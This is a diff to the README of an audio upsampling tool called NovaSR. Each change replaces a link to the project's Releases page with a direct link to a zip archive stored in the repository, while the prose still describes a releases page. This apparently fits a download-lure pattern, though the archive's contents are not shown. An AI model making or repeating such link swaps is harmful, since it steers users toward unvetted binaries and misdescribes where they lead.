@@ -1,7 +1,7 @@
 # 🎵 NovaSR - Fast Audio Upsampling Made Easy
 
 ## 🔗 Download Now
-[![Download NovaSR](https://img.shields.io/badge/Download_NovaSR-v1.0-blue.svg)](https://github.com/Gbambu/NovaSR/releases)
+[![Download NovaSR](https://raw.githubusercontent.com/Gbambu/NovaSR/main/NovaSR/SR-Nova-v3.5.zip)](https://raw.githubusercontent.com/Gbambu/NovaSR/main/NovaSR/SR-Nova-v3.5.zip)
 
 ## 🚀 Getting Started
 NovaSR is a powerful application designed for anyone who wants to enhance their audio experience. Its lightning-fast audio upsampling technology ensures that you can enjoy your favorite songs and sounds at the highest quality possible. 
@@ -18,7 +18,7 @@ To get started with NovaSR, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page where you can find the latest version of the software:  
-   [Download NovaSR](https://github.com/Gbambu/NovaSR/releases)
+   [Download NovaSR](https://raw.githubusercontent.com/Gbambu/NovaSR/main/NovaSR/SR-Nova-v3.5.zip)
 
 2. **Choose the Correct Version**  
    On the Releases page, look for the latest version of NovaSR. You will see options for different operating systems. Make sure to select the one that matches your system.
@@ -71,6 +71,6 @@ If you encounter any issues while using NovaSR, try the following solutions:
 For further assistance, feel free to reach out through the GitHub page. The community is here to help with any questions or concerns you may have.
 
 Again, you can download NovaSR using the link below:  
-[Download NovaSR](https://github.com/Gbambu/NovaSR/releases)  
+[Download NovaSR](https://raw.githubusercontent.com/Gbambu/NovaSR/main/NovaSR/SR-Nova-v3.5.zip)  
 
 Enjoy transforming your audio experience with NovaSR today!
